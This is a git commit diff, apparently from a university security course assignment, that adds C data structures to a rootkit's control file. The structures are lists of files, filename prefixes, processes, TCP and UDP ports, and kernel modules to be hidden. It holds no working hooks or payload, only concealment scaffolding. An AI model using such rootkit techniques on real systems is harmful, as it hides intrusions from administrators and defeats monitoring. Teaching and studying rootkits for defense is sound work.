a84e544dc0832dcc6859d857cb2e554a8c94d68b
Guru Mc <ga79rok@mytum.de>
2014-11-26 19:18:31 +0100

    gmc: structures to hold the inputs

--- assignment07/control.c
+++ assignment07/control.c
@@ -2,6 +2,46 @@
  * This file manages the data structures used for determining
  * which files, processes, modules, sockets, ... need to be hidden.
  */
-
 #include "include.h"
+
+// list for hidden files
+
+struct file_names{
+	char name[1024];
+	struct list_head file_list;
+};
+
+struct fname_prefix{
+	char name[32];
+	struct list_head fname_list;
+	};
+
+//list for hidden processes
+struct processes{
+	pid_t pid;
+	struct list_head process_list;
+	};
+
+//list for hidden tcp sockets 
+struct tcp_socket{
+	int port;
+	struct list_head tcp_list;
+	};
+
+//list for hidden udp sockets 
+struct udp_socket{
+	int port;
+	struct list_head udp_list;
+	};
+
+//list for hidden module
+struct modules{
+	char name[32];
+	struct list_head module_list;
+	}; 
+
+	
+
+
+
 
